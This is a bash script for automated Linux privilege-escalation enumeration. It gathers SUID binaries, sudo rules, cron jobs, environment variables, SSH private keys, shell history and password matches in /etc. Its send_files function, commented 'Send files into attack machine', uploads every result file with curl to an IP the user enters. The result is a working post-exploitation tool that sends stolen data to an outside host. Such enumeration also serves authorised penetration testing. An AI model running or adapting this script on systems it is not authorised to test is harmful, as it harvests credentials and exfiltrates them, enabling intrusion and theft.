#!/bin/bash

# Linux Privilege Escalation Automation Script
# Author: Security Assessment Tool
# Purpose: Automated enumeration for privilege escalation vectors

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
echo "=================================================="
echo "    Linux Privilege Escalation Automation"
echo "=================================================="
echo -e "${NC}"

# Create output directory
OUTPUT_DIR="${1:-'privesc_results'}"
mkdir -p "$OUTPUT_DIR"

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
    echo "[INFO] $1" >> "$OUTPUT_DIR/privesc_log.txt"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
    echo "[WARNING] $1" >> "$OUTPUT_DIR/privesc_log.txt"
}

log_critical() {
    echo -e "${RED}[CRITICAL]${NC} $1"
    echo "[CRITICAL] $1" >> "$OUTPUT_DIR/privesc_log.txt"
}

# System Information
system_info() {
    log_info "Gathering system information..."
    {
        echo "=== SYSTEM INFORMATION ==="
        echo "Hostname: $(hostname)"
        echo "Kernel: $(uname -a)"
        echo "OS Release: $(cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null)"
        echo "Architecture: $(uname -m)"
        echo "Current User: $(whoami)"
        echo "User ID: $(id)"
        echo "Groups: $(groups)"
        echo "Date: $(date)"
        echo
    } > "$OUTPUT_DIR/system_info.txt"
}

# Check for SUID/SGID binaries
check_suid_sgid() {
    log_info "Checking for SUID/SGID binaries..."
    {
        echo "=== SUID BINARIES ==="
        find / -type f -perm -4000 2>/dev/null | sort
        echo
        echo "=== SGID BINARIES ==="
        find / -type f -perm -2000 2>/dev/null | sort
        echo
        echo "=== WORLD WRITABLE SUID/SGID ==="
        find / -type f \( -perm -4000 -o -perm -2000 \) -perm -002 2>/dev/null
    } > "$OUTPUT_DIR/suid_sgid.txt"

    # Check for interesting SUID binaries
    INTERESTING_SUID=("nmap" "vim" "nano" "find" "python" "perl" "ruby" "php" "gcc" "make" "gdb" "strace" "tcpdump")
    for binary in "${INTERESTING_SUID[@]}"; do
        if find / -name "$binary" -type f -perm -4000 2>/dev/null | grep -q .; then
            log_critical "Found interesting SUID binary: $binary"
        fi
    done
}

# Check sudo permissions
check_sudo() {
    log_info "Checking sudo permissions..."
    {
        echo "=== SUDO PERMISSIONS ==="
        sudo -l 2>/dev/null || echo "Cannot run sudo -l"
        echo
        echo "=== SUDOERS FILE ==="
        cat /etc/sudoers 2>/dev/null || echo "Cannot read /etc/sudoers"
        echo
        echo "=== SUDO DIRECTORY ==="
        ls -la /etc/sudoers.d/ 2>/dev/null || echo "Cannot access /etc/sudoers.d/"
    } > "$OUTPUT_DIR/sudo_info.txt"
}

# Check for writable files and directories
check_writable() {
    log_info "Checking for writable files and directories..."
    {
        echo "=== WORLD WRITABLE DIRECTORIES ==="
        find / -type d -perm -002 2>/dev/null | head -20
        echo
        echo "=== WORLD WRITABLE FILES ==="
        find / -type f -perm -002 2>/dev/null | head -20
        echo
        echo "=== FILES WRITABLE BY CURRENT USER ==="
        find / -type f -writable 2>/dev/null | grep -v "/proc\|/sys\|/dev" | head -20
    } > "$OUTPUT_DIR/writable_files.txt"
}

# Check cron jobs
check_cron() {
    log_info "Checking cron jobs..."
    {
        echo "=== USER CRONTAB ==="
        crontab -l 2>/dev/null || echo "No user crontab"
        echo
        echo "=== SYSTEM CRONTABS ==="
        cat /etc/crontab 2>/dev/null || echo "Cannot read /etc/crontab"
        echo
        echo "=== CRON DIRECTORIES ==="
        ls -la /etc/cron* 2>/dev/null
        echo
        echo "=== CRON JOBS ==="
        find /etc/cron* -type f 2>/dev/null | xargs cat 2>/dev/null
    } > "$OUTPUT_DIR/cron_info.txt"
}

# Check services and processes
check_services() {
    log_info "Checking running services and processes..."
    {
        echo "=== RUNNING PROCESSES ==="
        ps aux
        echo
        echo "=== LISTENING PORTS ==="
        netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null
        echo
        echo "=== SYSTEMD SERVICES ==="
        systemctl list-units --type=service --state=running 2>/dev/null || echo "systemctl not available"
    } > "$OUTPUT_DIR/services_processes.txt"
}

# Check environment variables
check_environment() {
    log_info "Checking environment variables..."
    {
        echo "=== ENVIRONMENT VARIABLES ==="
        env
        echo
        echo "=== PATH VARIABLE ==="
        echo "$PATH"
        echo
        echo "=== LD_PRELOAD ==="
        echo "$LD_PRELOAD"
    } > "$OUTPUT_DIR/environment.txt"
}

# Check for interesting files
check_interesting_files() {
    log_info "Searching for interesting files..."
    {
        echo "=== CONFIGURATION FILES ==="
        find /etc -name "*.conf" -type f 2>/dev/null | head -20
        echo
        echo "=== LOG FILES ==="
        find /var/log -type f 2>/dev/null | head -20
        echo
        echo "=== BACKUP FILES ==="
        find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null | head -20
        echo
        echo "=== SSH KEYS ==="
        find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
        echo
        echo "=== HISTORY FILES ==="
        find /home -name ".*history" 2>/dev/null
        find /root -name ".*history" 2>/dev/null
    } > "$OUTPUT_DIR/interesting_files.txt"
}

# Check kernel exploits
check_kernel_exploits() {
    log_info "Checking for potential kernel exploits..."
    KERNEL_VERSION=$(uname -r)
    {
        echo "=== KERNEL VERSION ==="
        echo "$KERNEL_VERSION"
        echo
        echo "=== POTENTIAL KERNEL EXPLOITS ==="
        echo "Check the following resources for kernel exploits:"
        echo "- https://github.com/SecWiki/linux-kernel-exploits"
        echo "- https://www.exploit-db.com/"
        echo "- CVE databases for kernel version: $KERNEL_VERSION"
    } > "$OUTPUT_DIR/kernel_exploits.txt"
}

# Check for Docker/Container escape
check_containers() {
    log_info "Checking for container environment..."
    {
        echo "=== CONTAINER DETECTION ==="
        if [ -f /.dockerenv ]; then
            echo "Running inside Docker container"
        fi

        if grep -q docker /proc/1/cgroup 2>/dev/null; then
            echo "Docker container detected in cgroups"
        fi

        if grep -q lxc /proc/1/cgroup 2>/dev/null; then
            echo "LXC container detected"
        fi

        echo
        echo "=== DOCKER SOCKET ==="
        ls -la /var/run/docker.sock 2>/dev/null || echo "Docker socket not found"

        echo
        echo "=== CONTAINER CAPABILITIES ==="
        capsh --print 2>/dev/null || echo "capsh not available"
    } > "$OUTPUT_DIR/container_info.txt"
}

# Check file capabilities
check_capabilities() {
    log_info "Checking file capabilities..."
    {
        echo "=== FILE CAPABILITIES ==="
        getcap -r / 2>/dev/null | head -20
    } > "$OUTPUT_DIR/capabilities.txt"
}

# Check for password files
check_passwords() {
    log_info "Searching for password-related files..."
    {
        echo "=== SHADOW FILE PERMISSIONS ==="
        ls -la /etc/shadow /etc/passwd /etc/group 2>/dev/null
        echo
        echo "=== SEARCHING FOR PASSWORDS IN FILES ==="
        grep -r "password" /etc/ 2>/dev/null | grep -v Binary | head -10
        echo
        echo "=== DATABASE FILES ==="
        find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | head -10
    } > "$OUTPUT_DIR/password_files.txt"
}

# Generate summary report
generate_summary() {
    log_info "Generating summary report..."
    {
        echo "=== PRIVILEGE ESCALATION SUMMARY ==="
        echo "Scan completed: $(date)"
        echo "Output directory: $OUTPUT_DIR"
        echo
        echo "=== CRITICAL FINDINGS ==="
        grep -h "CRITICAL" "$OUTPUT_DIR/privesc_log.txt" 2>/dev/null || echo "No critical findings logged"
        echo
        echo "=== RECOMMENDATIONS ==="
        echo "1. Review SUID/SGID binaries for potential abuse"
        echo "2. Check sudo permissions and misconfigurations"
        echo "3. Examine writable files and directories"
        echo "4. Analyze cron jobs for privilege escalation"
        echo "5. Review running services for vulnerabilities"
        echo "6. Check for kernel exploits based on version"
        echo "7. Examine file capabilities"
        echo "8. Look for exposed credentials in files"
        echo
        echo "=== FILES GENERATED ==="
        ls -la "$OUTPUT_DIR/"
    } > "$OUTPUT_DIR/summary_report.txt"
}


ask_yes_no() {
    local PROMPT="$1"
    local DEFAULT="${2:-y}"  # Default to 'y' if not provided

    local CHOICE
    while true; do
        if [[ "$DEFAULT" == "y" ]]; then
            read -rp "$PROMPT [Y/n] " CHOICE
            CHOICE="${CHOICE:-y}"
        else
            read -rp "$PROMPT [y/N] " CHOICE
            CHOICE="${CHOICE:-n}"
        fi

        case "$CHOICE" in
            [Yy]) return 0 ;;  # yes
            [Nn]) return 1 ;;  # no
            *) echo "Please answer y or n." ;;
        esac
    done
}

# Send files into attack machine
send_files() {
    read -rp "Enter IP address to send files to: " IP

    local DIR=$OUTPUT_DIR
    if [[ -n "$IP" ]]; then
        if [[ "$IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            for FILE in "$DIR"/*; do
                if [[ -f "$FILE" ]]; then
                    echo "Sending $FILE..."
                    curl -X POST "http://$IP:8000/upload" -F "files=@$FILE"
                fi
            done
        else
            echo "Invalid IP address format: $IP"
            return 1
        fi
    else
        echo "Missing IP address"
        return 1
    fi
}


# Main execution
main() {
    log_info "Starting Linux privilege escalation enumeration..."

    system_info
    check_suid_sgid
    check_sudo
    check_writable
    check_cron
    check_services
    check_environment
    check_interesting_files
    check_kernel_exploits
    check_containers
    check_capabilities
    check_passwords
    generate_summary

    log_info "Enumeration complete! Results saved in: $OUTPUT_DIR"
    echo -e "${GREEN}Summary report: $OUTPUT_DIR/summary_report.txt${NC}"

    if ask_yes_no "Do you want to send files? \n (setup first python-uploadserver)" "y"; then
        echo "Continuing..."
        send_files
    fi
}

# Run the script
main
